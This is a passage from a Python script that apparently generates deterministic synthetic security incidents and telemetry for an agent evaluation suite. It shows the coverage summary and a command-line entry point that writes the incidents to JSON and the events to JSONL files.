        "telemetry_events_total": sum(telemetry_source_counts.values()),
        "tactics": dict(sorted(tactic_counts.items())),
        "techniques": dict(sorted(technique_counts.items())),
        "severity": dict(sorted(severity_counts.items())),
        "response_class": dict(sorted(response_counts.items())),
        "telemetry_sources": dict(sorted(telemetry_source_counts.items())),
        "template_distribution": dict(sorted(template_counts.items())),
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate deterministic eval incidents.")
    parser.add_argument("--count", type=int, default=200, help="Number of incidents (default: 200)")
    parser.add_argument(
        "--out",
        type=Path,
        default=Path(__file__).parent.parent
        / "services"
        / "agents"
        / "tests"
        / "eval_data"
        / "synthetic_incidents.json",
        help="Output JSON path",
    )
    parser.add_argument(
        "--telemetry-out",
        type=Path,
        default=Path(__file__).parent.parent
        / "services"
        / "agents"
        / "tests"
        / "eval_data"
        / "synthetic_telemetry.jsonl",
        help="Output JSONL path for the synthetic telemetry stream (one event per line)",
    )
    parser.add_argument("--coverage", action="store_true", help="Print coverage report after generating")
    args = parser.parse_args()

    incidents = generate_incidents(args.count)
    args.out.parent.mkdir(parents=True, exist_ok=True)
    args.out.write_text(json.dumps(incidents, indent=2) + "\n")

    n_events = write_telemetry_jsonl(incidents, args.telemetry_out)

    print(f"Wrote {len(incidents)} incidents to {args.out}")
    print(f"Wrote {n_events} telemetry events to {args.telemetry_out}")
    if args.coverage:
        report = coverage_report(incidents)
        print("\n=== Coverage ===")
        print(json.dumps(report, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
